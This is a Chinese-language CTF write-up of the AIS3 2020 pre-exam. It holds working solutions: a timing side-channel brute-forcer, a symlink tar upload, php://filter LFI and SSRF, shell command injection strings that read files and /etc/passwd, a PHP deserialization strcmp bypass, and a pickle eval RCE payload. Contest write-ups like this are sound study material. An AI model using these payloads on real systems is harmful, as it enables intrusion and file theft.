---
title: AIS3 2020 Pre-exam Writeups
date: 2020-06-32 11:52:10
categories: 
- CTF
tag:
- AIS3
---
![ ](https://photos.smugmug.com/photos/i-KRMHvGW/0/971fa681/L/i-KRMHvGW-L.png)

第一次參加為期三天AIS3 pre-exam，酷ㄛ > <
不過以我這年紀來說好像有點晚了，看到好多高中生參賽不禁回想我高中到底在幹嘛www
平常在CTFTime的線上賽已經習慣找**stavhaygn**求開示，這次個人賽只能靠自己了 QwQ

<!--more-->

## Preface

先放上人權圖（可右鍵縮放），雖然成績不怎麼樣www
{% gp 2-2 %}
![ ](https://photos.smugmug.com/photos/i-G3TKGKC/0/b3d63b23/X4/i-G3TKGKC-X4.png?400x)
![ ](https://photos.smugmug.com/photos/i-L9SRjz5/0/ee0c8c88/X4/i-L9SRjz5-X4.png?400x)
{% endgp %}

這份writeup基本上把300分以下的補完了，如果有其他建議還請不吝指教。
（各題原始分數為500分，根據CTFd的計分規則，題目似乎到180人解就會降到底100分。）

### 官方Writeups:
[ TBA ]

## Misc (Solved: 4/6)

### 💤 Piquero (100 points, 347 solves)

#### Description
![ ](https://photos.smugmug.com/photos/i-h86bKzR/0/3e757798/X5/i-h86bKzR-X5.jpg)
#### Solution
利用線上工具 [Braille Decoder](https://www.dcode.fr/braille-alphabet) 即可，要注意的是點字的大寫規則(.a = A)，包含我在內很多人的錯誤率都從這邊來的XD 若想瞭解一下細節不妨可以參考 [啾啾鞋 - ⠓⠥⠈⠨⠐⠙⠌⠂⠙⠯⠈⠙⠞⠈⠓⠱⠐⠕](https://youtu.be/1aop1ursHVE)。

### 🐥 Karuego (100 points, 245 solves)
#### Description

題目給了一張Karuego圖（捏他「入間同學入魔了！」），這裡就不附了w。

#### Solution

直覺就是圖片隱寫術(Steganography)，通常都會先用`binwalk`看看有沒有藏檔案，不過這裡我直接拿去丟`stegsolve`神器，從LSB不小心挖到奇怪的key，這才回頭用`foremost`找藏在圖片中的壓縮檔XD。

![ ](https://photos.smugmug.com/photos/i-ms6LbLL/0/239fdff4/M/i-ms6LbLL-M.png)

#### Solution 2
賽後和stavhaygn聊才知道用`binwalk`找到壓縮檔後可以用KPA(known plaintext attack)工具[PKcrack](https://github.com/keyunluo/pkcrack)去爆密碼，在官方的Discord群組也有看到同樣說法，看來也是預期解之一。


### 🌱 Soy (139 points, 172 solves)
#### Description
![](https://photos.smugmug.com/photos/i-CLfhQmW/0/da347d98/M/i-CLfhQmW-M.png)

#### Solution

利用線上工具 [qrazybox](https://merricx.github.io/qrazybox/) 將QRcode還原。從QRcode長寬可知ver.2，至於 format info 可以透過 Error Correction Level 和 Mask Pattern 的找到和題目相同的組合，剩下就格子點一點就有Flag了。

![ ](https://photos.smugmug.com/photos/i-FwcdDHV/0/61ae45e5/M/i-FwcdDHV-M.png) ![](https://photos.smugmug.com/photos/i-GBgrBJD/0/bb86e693/M/i-GBgrBJD-M.png)

### 👑 Saburo (359 points, 108 solves)

#### Description
題目需要nc到官方Server，透過輸入字串後會得到"Haha, you lose in xx milliseconds."，其中的xx是隨機變動的數字（同樣輸入字串"a"，回傳的數字範圍會在11-15浮動），透過測試會發現輸入越接近flag數字會越大，直到猜到flag為止。
PS. flag is printable characters with AIS3{…}

#### Solution

對於要用來測試的table，考慮到flag除了英文字母及數字，可能還會有`{`, `}`, `_`之類的，可以利用python [string library](https://docs.python.org/2/library/string.html)。 之後逐步猜字，用統計的方式把table每個字元都測10遍找回傳ms最大的，如果最後抓不到回傳的數字代表戳到flag了XD。

另外還有一點，由於過程中需要不斷nc官方Server，因此需要特別用`conn.close()`關閉連線，不然跑久了會報錯，個人在這邊吃鱉一陣子...可見寫程式的習慣還是很重要的。

{% codeblock solve.py lang:python %}
from pwn import *
from string import *

table = list(ascii_letters+digits+punctuation)
#flag = "AIS3{A1r1ght_U_4r3_my_3n3nnies}"
flag = "AIS3{"

while True:
    max_val = 0
    target = ''
    for ch in table:
        payload = flag + ch
        max_local = 0
        for j in range(10):
            conn = remote("60.250.197.227", 11001)
            conn.recvuntil('Flag:')
            conn.sendline(payload)
            try:
                res = int(conn.recvline().split()[-2])
                conn.close()
            except:
                print(flag + ch)
                conn.close()
                sys.exit(0) 
            max_local = max(max_local, res)
    
        if max_local > max_val:
            target = ch
            max_val = max_local
    flag = flag + target
    print(flag)
{% endcodeblock %}

### 👿 Shichirou (Post-solved, 450 points, 65 solves)

#### Description
同樣是需要nc到官方Server，透過瞭解source code想辦法取得flag。

{% codeblock Shichirou_1869833657e9fef14ad2742e59bb96f4630db429.py lang:python %}
#!/usr/bin/env python3

import os
import sys
import tempfile
import subprocess
import resource

resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536))
os.chdir(os.environ['HOME'])

size = int(sys.stdin.readline().rstrip('\r\n'))
if size > 65536:
    print('File is too large.')
    quit()

data = sys.stdin.read(size)
with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf:
    with tempfile.TemporaryDirectory(dir='.') as outdir:
        tarf.write(data)
        tarf.flush()
        try:
            subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
        except:
            print('Broken tar file.')
            raise

        try:
            a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
            b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, \\
            'guess.txt')])
            a = a.split(b' ')[0]
            b = b.split(b' ')[0]
            assert len(a) == 40 and len(b) == 40
            if a != b:
                raise Exception('sha1')
        except:
            print('Different.')
            raise

        print(open('flag.txt', 'r').readline())
{% endcodeblock %}

#### Solution

賽後聽**stavhaygn**說這題對**MacacaHub**算考古題... 來自去年金盾獎決賽= =
不過從遊記[108金盾獎決賽](https://yctseng1227.github.io/191116-108-cyber-security-competition/)看得出來我沒有參與到解題過程，可惡QwQ


簡單解釋一下上方的code:
line 12 基本上就是輸入數字，即檔案大小。
line 17, 18 輸入tar包裝檔案（可以利用pwntool），然後在line 23進行解包。
line 29 - 36 針對官方Server的兩個檔案 `guess.txt` 和 `flag.txt` 進行sha1比對，若相同就吐出flag。

我起初乍看之下還以為是sha1 bypass，但我們並不能改變Server的檔案，那我們到底是要上傳啥哩？

關鍵就是 [**Symbolic link**](https://en.wikipedia.org/wiki/Symbolic_link)，有點像是建立捷徑的概念，把 `guess.txt` 和 `flag.txt` 連結在一起。

首先，在本地端用指令建立連結，透過`ls`查看。
```shell
$ ln -s flag.txt guess.txt
$ ls -al
lrwxrwxrwx ... guess.txt -> flag.txt
```

再來就是進行tar打包（無壓縮）。
```shell
$ tar cvf guess.tar guess.txt
```

如此我們就能得到一個tar檔案，再來把扣摳一摳就行了吧。

{% codeblock solve.py lang:python %}
from pwn import *

conn = remote('60.250.197.227', 11000)

with open('./guess.tar', 'rb') as f:
    tar = f.read()

num = len(tar)
conn.sendline(str(num))
conn.sendline(tar)
conn.interactive()
{% endcodeblock %}

BOOOOOOOM，RUN起來結果看起來是爛掉了。
![](https://i.imgur.com/x99iZre.png)

從第四行看得出來 `guess.txt` 和 `flag.txt` 似乎不在同一個目錄中。
不過錯誤提示也把路徑告訴我們了，簡單講大guy長得像底下這樣。
```
/home/ctf/
├── flag.txt
├── tmp7lzztdlk
│   ├── guess.txt
```

那就把連結的部分刪掉重來一遍！
```shell
$ rm guess.txt guess.tar # 記得把舊檔砍掉
$ ln -s /home/ctf/flag.txt guess.txt
$ ls -al
lrwxrwxrwx ... guess.txt -> /home/ctf/flag.txt
$ tar cvf guess.tar guess.txt
```

再一次把py檔run起來就能拿flag了~

### 🧸 Clara (Unsolved, 500 points, 2 solves)


## Reverse
### 🍍 TsaiBro (100 points, 281 solves)
#### Description

#### Solution
題目幾乎同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。

### 🎹 Fallen Beat (144 points, 171 solves)
#### Description

#### Solution

### 🧠 Stand up!Brain (455 points, 62 solves)
#### Description

#### Solution

### 🍹 Long Island Iced Tea (Unsolved, 498 points, 15 solves)

### 🌹 La vie en rose (Unsolved, 499 points, 12 solves)

### 🐉 Uroboros (Unsolved, 500 points, 9 solves)


## Pwn
部分題目需要召喚 **stavhaygn**'s writeup (`・ω・´)

### 👻 BOF (100 points, 189 solves)
#### Description

#### Solution

### 📃 Nonsense (Unsolved, 474 points, 47 solves)

### 🔫 Portal gun (Unsolved, 491 points, 28 solves)

### 🏫 Morty school (Unsolved, 498 points, 14 solves)

### 🔮 Death crystal (Unsolved, 499 points, 10 solves)

### 📦 Meeseeks box (Unsolved, 500 points, 8 solves)


## Crypto

### 🦕 Brontosaurus (100 points, 380 solves)

-

### 🦖 T-Rex (100 points, 381 solves)

-

### 🐙 Octopus (Unsolved, 372 points, 103 solves)

### 🐡 Blowfish (Unsolved, 480 points, 42 solves)

### 🐪 Camel (Unsolved, 497 points, 18 solves)

### 🐢 Turtle (Unsolved, 498 points, 14 solves)


## Web

### 🦈 Shark (100 points, 261 solves)

#### Description

打開畫面後有個Link `Shark never cries?`，點開如下。
![ ](https://photos.smugmug.com/photos/i-Jh4mBDX/0/5698d631/X2/i-Jh4mBDX-X2.png)

#### Solution

題目幾乎同去年AIS3 pre-exam，似乎是出題者被上層指示每項分類要有一題和往年方向相同。
雖說如此，我在Day1戳半天戳不出結果，到Day2才發現考古題這件事 XD

首先，從Link的後綴可以觀察到`?path=hint.txt`，基本上可以聯想到`LFI`相關的題型，透過幾個基本的 `php://filter` 嘗試撈出source code。
例如 `php://filter/convert.base64-encode/resource=index.php`，把拿到的base64還原可以得到下面code。

{% codeblock lang:php %}
<?php

    if ($path = @$_GET['path']) {
        if (preg_match('/^(\.|\/)/', $path)) {
            // disallow /path/like/this and ../this
            die('<pre>[forbidden]</pre>');
        }
        $content = @file_get_contents($path, FALSE, NULL, 0, 1000);
        die('<pre>' . ($content ? htmlentities($content) : '[empty]') . '</pre>');
    }

?><!DOCTYPE html>
<head>
    <title>🦈🦈🦈</title>
    <meta charset="utf-8">
</head>
<body>
    <h1>🦈🦈🦈</h1>
    <a href="?path=hint.txt">Shark never cries?</a>
</body>
{% endcodeblock %}


不過看起來沒有我們想要的資訊，只知道檔了很多存取目錄的方式，而確定`php://filter`方法可行。
再來就是題目一開始給的提示"Please find the other server in the internal network! (flag is on that server)"
那就來翻翻看 `/etc/hosts`... 不過沒有我們要的資訊。

Day1我就就卡在這裡，直到找到去年writeup才發現有`/proc/net/fib_trie`可查到內網的ip位址。
```
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.22.0.0/16 2 0 2
        +-- 172.22.0.0/30 2 0 2
           |-- 172.22.0.0
              /32 link BROADCAST
              /16 link UNICAST
           |-- 172.22.0.3             <--- WE ARE HERE
              /32 host LOCAL
        |-- 172.22.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
 
```

之後就照著writeup走，找找`172.22.0.3`附近的ip，例如 `172.22.0.2`。
最後直接 `?path=http://172.22.0.2/flag` 就能拿flag了 ~

### 🐿 Squirrel (Post-solved, 100 points, 220 solves)

#### Description

點進連結 畫面就是一堆松鼠帶著系統目錄跑來跑去...

![ ](https://photos.smugmug.com/photos/i-kNQNkKt/0/fe39698a/X2/i-kNQNkKt-X2.png)

題外話... 同樣用Chrome不同系統看的emoji都不太一樣 蠻有趣的wwwww

![ ](https://photos.smugmug.com/photos/i-KLc6rCp/0/fcb53ee6/X2/i-KLc6rCp-X2.png)

#### Solution

解題人數明明破200位，但直到競賽結尾我還是沒解出來，事後證明我想太多了 QwQ

首先，從網頁source code可以看到些許端倪。
![ ](https://photos.smugmug.com/photos/i-FQ9MSt8/0/909e20c4/X2/i-FQ9MSt8-X2.png)

透過網址後綴 `/api.php?get=/etc/passwd` 可以撈到一些資訊，但這題看起來是沒什麼用。
![ ](https://photos.smugmug.com/photos/i-JDDb66T/0/edaa1905/X2/i-JDDb66T-X2.png)

基本上賽中我這裡就卡住了，一直想從網頁source code 的 Error Handling 下手 ...

其實，仔細想一下就可以發現，`?get=` + `file name` 能夠查看檔案內容... 那就不就是command `cat`嗎!!!!
既然如此，那來看看`cat api.php`應該也沒有問題吧!

透過網址後綴 `/api.php?get=api.php` 還真的把 `api.php` source code 撈出來了XD
![ ](https://photos.smugmug.com/photos/i-bphdSHh/0/97adad8b/X2/i-bphdSHh-X2.png)

從這份source code可以看到是用`shell_exec`執行指令，並且用 `'` 前後閉合起來。
那我們下一步就能利用 command injection 的 `;` 截斷執行我們想要的command ~
例如 `/api.php?get=';ls'`，記得要加上 `'` 將前後閉合ㄛ （同SQLi的概念）
![ ](https://photos.smugmug.com/photos/i-HTgtrLg/0/8a48d8eb/X2/i-HTgtrLg-X2.png)

能夠列出當前目錄，那就能繼續深入找找是否有些好玩的東西(?)
例如 `/api.php?get=';ls ../../../'` 好像... 有個可疑的檔案？
![ ](https://photos.smugmug.com/photos/i-qGfG6tW/0/0bc6b7ea/X2/i-qGfG6tW-X2.png)

嘿嘿那就來看看裡面有沒有flag吧！ 
開心使用 `/api.php?get='; cat ../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt'`，有了!!!

不過打了這麼長一串... 是不是忘記那個 `?get=` 其實就等同 `cat` 功能 www
直接在後面接目錄檔名就行了 `/api.php?get=../../../5qu1rr3l_15_4_k1nd_0f_b16_r47.txt`
![ ](https://photos.smugmug.com/photos/i-d7bc7TN/0/33478c04/X2/i-d7bc7TN-X2.png)

### 🐘 Elephant (168 points, 165 solves)

#### Description

點進連結，可以看到是個登入頁面（還有需要反白的彩蛋??）
![ ](https://photos.smugmug.com/photos/i-FVpLnh7/0/16ced600/X2/i-FVpLnh7-X2.png)

隨意輸入後，下方說明文字說明token不足以讀flag（同樣有需要反白的彩蛋??）

![ ](https://photos.smugmug.com/photos/i-8PXVQsn/0/932c7366/X2/i-8PXVQsn-X2.png)

#### Solution

這題當初真的是超乎預期地通靈拿到flag，完全不明白考點在哪 = =

> 「所以才說有些題目就是知識斷片，才要用通靈的方式跳上去」 by 逆逆

因此賽後找了**stavhaygn**完整還原一下這題的重點。

首先簡單講個人的通靈解法 XD
登入後可以把cookies的字串拿去base64 decode得到下列字串。

```
O:4:"User":2:{s:4:"name";s:4:"haha";s:11:"Usertoken";s:32:"6cdc79ae4ac3bd4ade8162dc68d2d50d";}
```

格式上看得出是`type:length:data`，但我發現中間的`s:11:"Usertoken"`... 算算長度應該是 9 吧(?)
嗯。我就真的手動改成`s:9:"Usertoken"`再base64 encode後填回去cookies，重新整理頁面後就噴flag了...

（？？？黑人問號）

其實上面的字串格式叫做「序列化(serialization)」，我平常沒什麼摸真的不太瞭解 www

正確的作法應該是從`/.git`，可以發現並非 404 not found 而是 403 forbidden。
![ ](https://photos.smugmug.com/photos/i-qnrmfmL/0/ac4a54e0/X2/i-qnrmfmL-X2.png)

利用[GitHack](https://github.com/lijiejie/GitHack)，把檔案還原出來。
![ ](https://photos.smugmug.com/photos/i-QJ7DLPd/0/41a6132f/XL/i-QJ7DLPd-XL.jpg)

{% codeblock index.php lang:php%}
<?php

const SESSION = 'elephant_user';
$flag = file_get_contents('/flag');

class User {
    public $name;
    private $token;
    function __construct($name) {
        $this->name = $name;
        $this->token = md5($_SERVER['REMOTE_ADDR'] . rand());
    }
    function canReadFlag() {
        return strcmp($flag, $this->token) == 0;
    }
}

if (isset($_GET['logout'])) {
    header('Location: /');
    setcookie(SESSION, NULL, 0);
    exit;
}

$user = NULL;
if ($name = $_POST['name']) {
    $user = new User($name);
    header('Location: /');
    setcookie(SESSION, base64_encode(serialize($user)), time() + 600);
    exit;
} else if ($data = @$_COOKIE[SESSION]) {
    $user = unserialize(base64_decode($data));
}
{% endcodeblock %}

這份source code有幾個重點:
line 8 token的類別定義為`private` (稍後會提到)
line 11 token產生的方式為Random + MD5 Hash
line 14 拿flag的條件: `$flag == $this->token`
line 28 serialize function

這題關鍵在`strcmp bypass`。
而`$flag`寫在後端無法修改，我們也沒辦法控制token的random值。
從網路找的資訊為`strcmp`在遇到**字串**和**陣列**比較時將回傳NULL，利用PHP的弱型別特性 `NULL == 0` 會成立。

那我們不就只要把拿到的序列化字串手動修改不就行了嗎 ~

```
O:4:"User":2:{s:4:"name";s:4:"haha";s:11:"Usertoken";a:0:{};}
```

很遺憾... 不行。如果改完再encode貼到cookies會被登出。
問題在於一些程式產生的**不可視字元**，同時也是我一開始發現字串長度很奇怪的部分。

關於PHP序列化格式，可以參考這篇 [一文让PHP反序列化从入门到进阶](https://xz.aliyun.com/t/6753)
其中類別中的三種權限的表示方式:
> public: `data`
> private: %00`class name`%00`member name`
> protected: %00*%00`member name`

也能夠說明為何我看到的字串長度少 2（`%00` * 2），同時也無法直接修改。


那這些看不見的字元自然不能被手動複製貼上，那怎麼辦哩？ ... 既然是由程式產生的，那就寫回去ㄚ。
可以直接照搬上面的產生serialize的程式碼，再將原本token產生的方式改成array即可！

{% codeblock lang:php %}
<?php

class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = array();
    }
}

$user = new User("haha");
echo base64_encode(serialize($user));
{% endcodeblock %}

用PHP online之類的執行完就能把拿到的base64 code貼回去cookies，重新整理頁面拿flag ~

### 🐍 Snake (272 points, 137 solves)

#### Description

點開連結，題目直接把code以純文字顯示在頁面上。

{% codeblock lang:python %}
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')

    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)

            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()

    return open(__file__).read()
{% endcodeblock %}

#### Solution

簡單瞭解這份code:
line 10 表示我們可以透過後綴`/?data=`接一些字串
line 14 表示字串必須為base64格式
line 15 pickle ... ? 原來是肚子餓的部分（X）

![ ](https://photos.smugmug.com/photos/i-krmbvGD/0/c89c0580/M/i-krmbvGD-M.png)

line 17 永遠不可能成立的條件


用Google搜尋 "pickle ctf" 可以找到不少資料。


簡單講`pickle`是python用來**序列化**及**反序列化**的library


{% codeblock solve.py lang:python %}
import pickle
import base64

class test(object):
    def __reduce__(self):
        return(eval, ("open('/flag').read()",))

print(base64.b64encode(pickle.dumps(test())))
{% endcodeblock %}


`/?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg==`

### 🦉 Owl (Unsolved, 492 points, 27 solves)

### 🦏 Rhino (Unsolved, 494 points, 24 solves)



## Scoreboard
![](https://photos.smugmug.com/photos/i-CJP8xWG/0/6a9cd01e/5K/i-CJP8xWG-5K.png)